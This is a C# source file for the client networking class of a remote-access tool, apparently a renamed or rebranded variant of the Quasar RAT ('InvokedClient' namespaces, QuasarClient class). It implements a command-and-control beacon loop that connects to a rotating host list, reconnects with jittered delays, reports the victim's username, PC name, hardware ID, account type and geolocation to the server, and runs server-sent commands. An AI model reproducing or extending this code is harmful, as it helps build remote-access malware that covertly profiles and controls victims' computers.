

using System;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using InvokedClient.Config;
using InvokedClient.Helper;
using InvokedClient.IO;
using InvokedClient.IpGeoLocation;
using InvokedClient.User;
using InvokedCommon.DNS;
using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedCommon.Utilities;


namespace InvokedClient.Networking
{
	public class QuasarClient : Client, IDisposable
	{
		private bool _identified;
		private readonly HostsManager _hosts;
		private readonly SafeRandom _random;
		private readonly CancellationTokenSource _tokenSource;
		private readonly CancellationToken _token;

		public QuasarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
		  : base(serverCertificate)
		{
			this._hosts = hostsManager;
			this._random = new SafeRandom();
			this.ClientState += new Client.ClientStateEventHandler(this.OnClientState);
			this.ClientRead += new Client.ClientReadEventHandler(this.OnClientRead);
			this.ClientFail += new Client.ClientFailEventHandler(this.OnClientFail);
			this._tokenSource = new CancellationTokenSource();
			this._token = this._tokenSource.Token;
		}

		public void ConnectLoop()
		{
			while (true)
			{
				CancellationToken token = this._token;
				if (!token.IsCancellationRequested)
				{
					if (!this.Connected)
					{
						Host nextHost = this._hosts.GetNextHost();
						this.Connect(nextHost.IpAddress, nextHost.Port);
					}
					while (this.Connected)
					{
						try
						{
							token = this._token;
							token.WaitHandle.WaitOne(1000);
						}
						catch (Exception ex) when (ex is NullReferenceException || ex is ObjectDisposedException)
						{
							this.Disconnect();
							return;
						}
					}
					token = this._token;
					if (!token.IsCancellationRequested)
						Thread.Sleep(Settings.RECONNECTDELAY + this._random.Next(250, 750));
					else
						break;
				}
				else
					goto label_4;
			}
			this.Disconnect();
			return;
		label_4:;
		}

		private void OnClientRead(Client client, IMessage message, int messageLength)
		{
			if (!this._identified)
			{
				if (!(message.GetType() == typeof(ClientIdentificationResult)))
					return;
				this._identified = ((ClientIdentificationResult)message).Result;
			}
			else
				MessageHandler.Process((ISender)client, message);
		}

		private void OnClientFail(Client client, Exception ex) => client.Disconnect();

		private void OnClientState(Client client, bool connected)
		{
			this._identified = false;
			if (!connected)
				return;
			GeoInformation geoInformation = GeoInformationFactory.GetGeoInformation();
			UserAccount userAccount = new UserAccount();
			client.Send<ClientIdentification>(new ClientIdentification()
			{
				Version = Settings.VERSION,
				OperatingSystem = InvokedCommon.Helpers.PlatformHelper.FullName,
				AccountType = userAccount.Type.ToString(),
				Country = geoInformation.Country,
				CountryCode = geoInformation.CountryCode,
				ImageIndex = geoInformation.ImageIndex,
				Id = HardwareDevices.HardwareId,
				Username = userAccount.UserName,
				PcName = SystemHelper.GetPcName(),
				Tag = Settings.TAG,
				EncryptionKey = Settings.ENCRYPTIONKEY,
				Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE)
			});
		}

		public void Exit()
		{
			this._tokenSource.Cancel();
			this.Disconnect();
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			this._tokenSource.Cancel();
			this._tokenSource.Dispose();
		}
	}
}
